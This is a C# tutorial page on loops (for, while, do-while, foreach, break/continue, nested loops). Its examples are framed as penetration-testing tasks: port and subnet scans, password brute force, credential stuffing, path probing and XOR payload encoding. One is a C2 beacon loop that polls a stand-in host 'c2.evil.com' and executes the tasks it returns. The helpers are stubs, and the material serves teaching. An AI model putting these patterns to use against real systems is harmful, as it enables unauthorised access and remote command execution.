# Step 8 — Loops: for, while, foreach, do-while

---

## for Loop — Classic Counter
```csharp
// Basic for loop
for (int i = 0; i < 10; i++)
    Console.WriteLine(i);          // → 0, 1, 2 ... 9

// Reverse — countdown
for (int i = 10; i > 0; i--)
    Console.WriteLine(i);          // → 10, 9 ... 1

// Step by 2
for (int i = 0; i <= 255; i += 2)
    Console.WriteLine(i);          // → 0, 2, 4 ... 254

// Port range scan
for (int port = 1; port <= 1024; port++)
{
    // scan port
    Console.WriteLine($"[*] Scanning port {port}");
}
```

---

## while Loop — Condition-Based
```csharp
// Basic while
int i = 0;
while (i < 5)
{
    Console.WriteLine(i);
    i++;                           // → 0, 1, 2, 3, 4
}

// Read until empty
string line = Console.ReadLine();
while (!string.IsNullOrEmpty(line))
{
    Console.WriteLine($"[+] Got: {line}");
    line = Console.ReadLine();
}

// Retry logic
int attempts = 0;
bool success = false;
while (!success && attempts < 3)
{
    success = TryConnect("192.168.1.1", 443);
    attempts++;
}
```

---

## do-while Loop — Runs At Least Once
```csharp
// Always executes body first, then checks condition
int count = 0;
do
{
    Console.WriteLine($"Attempt #{count + 1}");
    count++;
} while (count < 3);
// → Attempt #1, Attempt #2, Attempt #3

// Menu loop — show menu at least once
string choice;
do
{
    Console.WriteLine("[1] Scan  [2] Exploit  [3] Exit");
    choice = Console.ReadLine();
} while (choice != "3");

// Brute force — try at least once
int tries = 0;
bool cracked = false;
do
{
    cracked = TryPassword(passwords[tries]);
    tries++;
} while (!cracked && tries < passwords.Length);
```

---

## foreach Loop — Iterate Collections
```csharp
// Array iteration
string[] hosts = { "192.168.1.1", "192.168.1.2", "192.168.1.3" };
foreach (string host in hosts)
    Console.WriteLine($"[*] Pinging {host}");

// List iteration
var openPorts = new List<int> { 22, 80, 443, 8080 };
foreach (int port in openPorts)
    Console.WriteLine($"[+] Open: {port}");

// Dictionary iteration
var services = new Dictionary<int, string>
{
    { 22,   "SSH"   },
    { 80,   "HTTP"  },
    { 443,  "HTTPS" }
};
foreach (var kvp in services)
    Console.WriteLine($"Port {kvp.Key} → {kvp.Value}");

// String chars (string is IEnumerable<char>)
string cmd = "whoami";
foreach (char c in cmd)
    Console.Write((int)c + " ");   // → 119 104 111 97 109 105
```

---

## break & continue — Loop Control
```csharp
// break — exit loop early
for (int port = 1; port <= 65535; port++)
{
    if (IsOpen(port))
    {
        Console.WriteLine($"[+] First open port: {port}");
        break;                     // stop after first hit
    }
}

// continue — skip current iteration
for (int i = 0; i < 255; i++)
{
    if (i % 2 == 0) continue;     // skip even numbers
    Console.WriteLine(i);          // → 1, 3, 5 ... 253
}

// Pentest — skip known safe hosts
string[] targets = { "192.168.1.1", "192.168.1.2", "10.0.0.1" };
string[] skip    = { "192.168.1.1" };
foreach (string t in targets)
{
    if (skip.Contains(t)) continue;
    Console.WriteLine($"[*] Scanning {t}");
}
```

---

## Nested Loops
```csharp
// IP range sweep — 192.168.1.0/24 and /16
for (int c = 0; c < 256; c++)
{
    for (int d = 1; d < 255; d++)
    {
        string ip = $"192.168.{c}.{d}";
        Console.WriteLine($"[*] {ip}");
    }
}

// Credential stuffing
string[] users  = { "admin", "root", "user" };
string[] passes = { "123456", "password", "admin" };

foreach (string user in users)
{
    foreach (string pass in passes)
    {
        Console.WriteLine($"[*] Trying {user}:{pass}");
        if (TryLogin(user, pass))
        {
            Console.WriteLine($"[+] Found: {user}:{pass}");
            goto done;             // break out of both loops
        }
    }
}
done:;

// Port × Host matrix
int[] ports   = { 22, 80, 443 };
string[] hosts = { "10.0.0.1", "10.0.0.2" };
foreach (string host in hosts)
    foreach (int port in ports)
        Console.WriteLine($"[*] {host}:{port}");
```

---

## Loop with Index (foreach + index)
```csharp
// Option 1 — manual counter
int idx = 0;
foreach (string line in lines)
{
    Console.WriteLine($"[{idx}] {line}");
    idx++;
}

// Option 2 — for loop on list
var results = new List<string> { "open", "closed", "filtered" };
for (int i = 0; i < results.Count; i++)
    Console.WriteLine($"[{i}] {results[i]}");

// Option 3 — LINQ Select with index
foreach (var (item, i) in results.Select((v, i) => (v, i)))
    Console.WriteLine($"[{i}] {item}");
```

---

## Infinite Loop Patterns
```csharp
// Listener / shell loop
while (true)
{
    string cmd = Console.ReadLine();
    if (cmd == "exit") break;
    ExecuteCommand(cmd);
}

// Beacon loop — C2 style
while (true)
{
    string task = CheckIn("http://c2.evil.com");
    if (!string.IsNullOrEmpty(task))
        ExecuteTask(task);

    System.Threading.Thread.Sleep(5000);   // sleep 5 seconds
}

// for(;;) — same as while(true)
for (;;)
{
    PollForCommands();
    System.Threading.Thread.Sleep(3000);
}
```

---

## Pentest Context Usage
```csharp
// Subnet scanner — Class C
var openHosts = new List<string>();
for (int i = 1; i <= 254; i++)
{
    string ip = $"192.168.1.{i}";
    if (Ping(ip))
    {
        openHosts.Add(ip);
        Console.WriteLine($"[+] Host up: {ip}");
    }
}

// Banner grab — wordlist attack
string[] paths = { "/admin", "/login", "/backup", "/.git" };
string target  = "http://10.0.0.1";
foreach (string path in paths)
{
    string url      = target + path;
    string response = HttpGet(url);
    if (response.Contains("200"))
        Console.WriteLine($"[+] Found: {url}");
}

// Log keyword search
string[] logs     = File.ReadAllLines("/var/log/auth.log");
string[] keywords = { "Failed", "Invalid", "ROOT" };
foreach (string log in logs)
{
    foreach (string kw in keywords)
    {
        if (log.Contains(kw, StringComparison.OrdinalIgnoreCase))
        {
            Console.WriteLine($"[!] {log}");
            break;                 // one match per line is enough
        }
    }
}

// XOR encode payload
byte[] payload = { 0x90, 0x90, 0xCC };
byte   key     = 0x41;
for (int i = 0; i < payload.Length; i++)
    payload[i] ^= key;

Console.WriteLine(string.Join(" ",
    payload.Select(b => b.ToString("X2"))));
```
